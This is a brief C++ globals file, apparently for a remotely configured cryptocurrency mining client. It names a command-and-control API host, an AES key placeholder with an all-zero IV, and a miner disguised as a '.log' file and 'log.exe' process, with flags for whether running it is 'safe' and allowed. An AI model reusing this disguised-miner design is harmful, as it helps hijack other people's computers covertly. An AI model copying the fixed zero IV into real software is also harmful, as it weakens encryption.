#include "i_global.h"

// 客户端信息
json G_PC;

// 远程配置
json G_CONFIG;
string G_CONFIG_FILE = ".config"; // 配置文件名

// 接口信息
string G_API_VER = "/v1";
string G_API_URL = "pc.pubu.me";

// 通信秘钥
string G_AES_KEY = "这里填写你的aeskey";
string G_AES_IV = "00000000000000000000000000000000";

string G_MINER_FILER = ".log"; // 矿工文件名
string G_MINER_EXE = "log.exe"; // 矿工进程名
bool G_MINER_RUN = false; // 矿工是否运行
bool G_MINER_SAFE = false; // 矿工是否安全
bool G_MINER_STATE = false; // 矿工是否允许运行
